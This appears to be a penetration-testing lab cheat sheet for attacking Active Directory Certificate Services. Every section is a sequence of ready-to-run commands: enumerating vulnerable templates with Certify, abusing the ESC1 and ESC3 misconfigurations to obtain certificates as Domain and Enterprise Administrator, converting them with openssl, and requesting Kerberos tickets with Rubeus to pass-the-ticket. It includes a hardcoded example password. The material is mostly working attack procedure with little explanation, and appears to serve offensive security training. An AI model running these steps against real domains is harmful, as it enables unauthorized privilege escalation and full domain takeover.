## Enumeration using Certify

- Check ADCS
```powershell
    C:\AD\Tools\Certify.exe cas
```

- List all templates (check manually for vulnerable templates)
```powershell
    C:\AD\Tools\Certify.exe find
```

- Check for vulnerable templates automatically
```powershell
    C:\AD\Tools\Certify.exe find /vulnerable
```

## ESC1

1. Find ESC1 vulnerable templates
```powershell
    C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
```

2. Request a certificate for Domain Admin - Administrator
```powershell
    C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```

3. Request a certificate for Enterprise Administrator
```powershell
    C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
```

4. Copy certificate to a file `.pem` and convert it to PFX
```powershell
    C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```

5. Request a TGT for DA using that certificate
```powershell
    C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt
```

## ESC3

The idea is that we are looking at a vulnerable certificate (cert1) with EKU for Certificate Request Agent, if we can find another template (cert2) that has an EKU that allows for domain authentication and has application policy requirement of certificate request agent (`Application Policies : Certificate Request Agent` & `pkiextendedkeyusage : Client Authentication`)

1. Request an Enrollment Agent Certificate from the template
```powershell
    C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

2. Copy certificate to a file `.pem` and convert it to PFX
```powershell
    C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
```

3. Now we are going to use that certificate to request a certificate for DA from the other template
```powershell
    C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx
```

4. Request a certificate for Enterprise Admin
```powershell
    C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx
```

5. Copy certificate to a file `.pem` and convert it to PFX
```powershell
    C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
```

6. Request TGT for DA
```powershell
    C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc3-DA.pfx /ptt
```
